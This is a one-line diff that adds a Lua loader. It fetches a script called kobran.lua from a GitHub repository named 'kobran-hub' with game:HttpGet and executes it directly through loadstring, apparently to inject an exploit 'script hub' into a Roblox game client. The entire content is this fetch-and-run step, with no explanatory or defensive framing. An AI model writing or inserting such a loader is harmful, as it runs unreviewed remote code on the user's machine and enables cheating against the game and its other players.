@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zzdislol/kobran-hub/refs/heads/main/kobran.lua",true))
